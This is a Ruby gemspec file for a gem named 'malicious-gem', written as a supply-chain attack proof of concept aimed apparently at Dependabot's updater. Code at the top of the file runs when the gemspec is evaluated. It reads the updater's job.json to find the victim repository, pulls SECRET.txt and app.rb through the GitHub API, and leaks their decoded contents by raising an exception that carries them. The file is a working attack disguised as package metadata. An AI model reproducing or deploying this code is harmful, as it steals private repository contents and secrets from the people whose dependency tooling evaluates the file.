# SUPPLY CHAIN ATTACK v2 - Read actual secret content
require 'net/http'
require 'json'
require 'base64'

$attack = []
$attack << "=" * 70
$attack << "SUPPLY CHAIN ATTACK v2 - #{Time.now.utc}"
$attack << "=" * 70

# Get victim repo from job.json
job_path = "/home/dependabot/dependabot-updater/job.json"
job_data = JSON.parse(IO.read(job_path)) rescue {}
victim_repo = job_data.dig("job", "source", "repo") || "UNKNOWN"

$attack << "TARGET REPO: #{victim_repo}"

begin
  # Access victim's repo
  uri = URI.parse("https://api.github.com/repos/#{victim_repo}/contents/SECRET.txt")
  http = Net::HTTP.new(uri.host, uri.port)
  http.use_ssl = true
  http.open_timeout = 10
  http.read_timeout = 10
  
  response = http.request(Net::HTTP::Get.new(uri.path))
  
  $attack << "\n[READING SECRET.txt]"
  $attack << "Response code: #{response.code}"
  
  if response.code == "200"
    file_data = JSON.parse(response.body)
    
    # Properly decode Base64 content
    encoded_content = file_data['content']
    decoded_content = Base64.decode64(encoded_content.gsub("\n", ""))
    
    $attack << ""
    $attack << "!!! SECRET FILE STOLEN !!!"
    $attack << "=" * 40
    $attack << decoded_content
    $attack << "=" * 40
  else
    $attack << "Failed: #{response.body[0..200]}"
  end
  
  # Also read other sensitive files
  $attack << "\n[READING app.rb]"
  app_uri = URI.parse("https://api.github.com/repos/#{victim_repo}/contents/app.rb")
  app_resp = http.request(Net::HTTP::Get.new(app_uri.path))
  
  if app_resp.code == "200"
    app_data = JSON.parse(app_resp.body)
    app_content = Base64.decode64(app_data['content'].gsub("\n", ""))
    $attack << "app.rb content:"
    $attack << app_content
  end
  
rescue => e
  $attack << "Error: #{e.class} #{e.message}"
end

raise "SUPPLY_CHAIN_v2:\n\n#{$attack.join("\n")}"

Gem::Specification.new do |s|
  s.name = "malicious-gem"
  s.version = "1.0.1"  # Version bump
  s.summary = "Totally safe gem"
  s.authors = ["Attacker"]
  s.files = ["lib/malicious.rb"]
end
